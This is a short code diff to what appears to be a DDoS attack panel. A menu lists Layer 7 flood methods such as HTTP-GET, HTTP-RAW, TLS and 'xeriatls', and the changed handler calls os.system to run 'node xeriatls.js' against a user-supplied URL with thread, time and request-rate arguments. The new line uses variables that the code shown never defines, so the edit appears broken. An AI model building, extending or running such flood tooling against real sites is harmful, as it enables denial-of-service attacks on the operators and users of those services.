@@ -169,7 +169,7 @@ def layer7():
  ╔═╦═══════════╬═══════════╦═══════════╬═══════════╦═╗
  ║A║  HTTP-API ║  HTTP-PRO ║   ovh     ║  HTTP-GET ║R║
  ║P║           ║   TLS     ║           ║  HTTP-POST║A║
- ║I║             ║xeriatls ║           ║  HTTP-RAW ║W║
+ ║I║           ║  xeriatls ║           ║  HTTP-RAW ║W║
  ╚═╣           ║           ║           ║           ╠═╝
    ║           ║           ║           ║           ║
    ║           ║           ║           ║           ║
@@ -628,7 +628,7 @@ def main():
          elif "xeriatls" in cnc:
             try:
                 url = cnc.split()[1]
-                os.system(f'./httpget {url} 10000 50 100')
+                os.system(f' node xeriatls.js {url} {thread} {time} {reqs}')
             except IndexError:
                 print('Usage: xeriatls <url> <thread> <time> <request_persecond>')
                 print('Example: xeriatls http://example.com')
